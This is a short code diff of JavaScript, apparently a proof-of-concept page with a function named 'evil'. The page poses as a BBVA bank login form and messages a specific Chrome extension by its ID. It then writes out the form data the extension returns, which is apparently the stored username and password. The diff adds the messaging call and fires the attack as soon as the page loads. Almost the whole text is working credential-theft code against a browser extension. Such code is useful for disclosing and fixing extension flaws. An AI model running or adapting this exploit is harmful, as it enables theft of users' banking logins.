@@ -9,7 +9,7 @@
 
             mydata = {"url":"https://idp.live.global.platform.bbva.com/idp/profile/SAML2/Redirect/SSO?execution=e2s1","nForms":1,"body":"BBVAsafeTranslate(\"remember\")He olvidado mi contraseñasafeTranslate(\"newRegister\")Regístrate","forms":[{"elements":["j_username","j_password","recaptcha-token","","_eventId_proceed","_eventId_proceed"],"action":"https://idp.live.global.platform.bbva.com/idp/profile/SAML2/Redirect/SSO?execution=e2s1"}]};
 
-
+            chrome.runtime.sendMessage('lccpigmnibjnlnnjekjlgadebepenohn', {operation: "init", data: mydata}, function(response) {console.log(response)});
             chrome.runtime.onMessage.addListener(function(request, sender, sendResponse) { 
                     console.log(request.data); 
                     document.write(request.data.formData[1]);
@@ -19,6 +19,7 @@
             chrome.runtime.sendMessage('lccpigmnibjnlnnjekjlgadebepenohn', {operation: "init", data: mydata}, function(response) {console.log(response)});
         }
         window.addEventListener("load", function () {
+            evil();
                                                 setTimeout(evil, 5000);
                                         }, false);
 
